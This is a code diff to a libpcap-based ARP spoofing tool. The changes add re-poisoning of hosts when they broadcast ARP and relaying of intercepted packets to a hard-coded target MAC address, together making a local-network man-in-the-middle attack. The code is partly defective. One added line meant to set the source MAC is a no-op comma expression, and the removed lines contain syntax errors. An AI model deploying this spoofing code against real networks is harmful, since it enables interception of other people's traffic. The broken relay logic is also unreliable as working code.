@@ -67,7 +67,7 @@ int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest
 
 
 uint8_t my_mac[6];
-
+uint8_t target_mac[6]={0xfe, 0x4e, 0xa4, 0xa0, 0xea, 0x64};
 int main(int argc, char* argv[]) {
 	if (argc <4 || (argc%2)!=0) {
 		usage();
@@ -115,11 +115,13 @@ int main(int argc, char* argv[]) {
 	}
 	printf("attack All\n");
 
+	struct pcap_pkthdr* header;
 	const u_char* rcvpacket;
 	PEthHdr ethernet_hdr;
 	PArpHdr arp_hdr;
 	while(true){
 		int res = pcap_next_ex(handle, &header, &rcvpacket);
+		printf("rcv packet!\n");
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
 
@@ -132,12 +134,20 @@ int main(int argc, char* argv[]) {
 			arp_hdr = (PArpHdr)rcvpacket;
 
 			Ip reinfect_sender = Ip(arp_hdr->sip());
-
+			if(send_packet_arp(Mac(arp_hdr->smac()),Mac(my_mac),Mac(arp_hdr->smac()),arp_hdr->tip(), arp_hdr->sip(),false)==0){
+				printf("reinfect!\n");
+			}
 		}
 		else{
-			if(send_packet_arp(Mac(arp_hdr->smac();),Mac(my_mac),Mac(arp_hdr->smac();),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
-			printf("attack\n");
-		}
+
+			ethernet_hdr->dmac_ = Mac(target_mac);
+			ethernet_hdr->smac_, Mac(my_mac);
+			if(pcap_sendpacket(handle, rcvpacket, header->len)!=0){
+				printf("Error sending packet!\n");
+			}
+			else{
+				printf("Packet sent succesfully.\n");
+			}
 		}
 	}
 
